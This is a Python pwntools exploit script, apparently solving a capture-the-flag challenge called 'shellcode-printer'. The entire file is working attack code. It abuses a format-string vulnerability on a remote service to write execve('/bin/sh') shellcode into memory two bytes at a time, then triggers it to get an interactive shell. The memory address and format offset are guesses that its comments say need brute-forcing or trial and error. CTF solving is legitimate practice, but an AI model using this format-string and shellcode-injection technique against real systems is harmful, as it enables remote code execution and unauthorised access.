from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

HOST, PORT = 'shellcode-printer.nc.jctf.pro', 1337
p = remote(HOST, PORT)

# Estimate mmap() base address (often in 0x404000–0x405000 range)
# Try bruteforcing if unsure
base_addr = 0x404000

# Prepare shellcode chunks (2 bytes each, written backwards)
shellcode = (
    b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e"
    b"\x2f\x73\x68\x00\x57\x48\x89\xe7\x48\x31"
    b"\xc0\xb0\x3b\x0f\x05"
)

chunks = [u16(shellcode[i:i+2].ljust(2, b'\x00')) for i in range(0, len(shellcode), 2)]
addrs = [base_addr + 0x1000 - 2 * (i + 1) for i in range(len(chunks))]

# Adjust this offset if needed (trial-and-error via testing)
fmt_offset = 6

def send_fmt(value, addr):
    payload = fmtstr_payload(fmt_offset, {addr: value}, write_size='short')
    p.sendlineafter("Enter a format string: ", payload)

# Inject shellcode 2 bytes at a time
for val, addr in zip(chunks, addrs):
    send_fmt(val, addr)

# Trigger execution
p.sendlineafter("Enter a format string: ", "")

# Interact (shell or flag)
p.interactive()

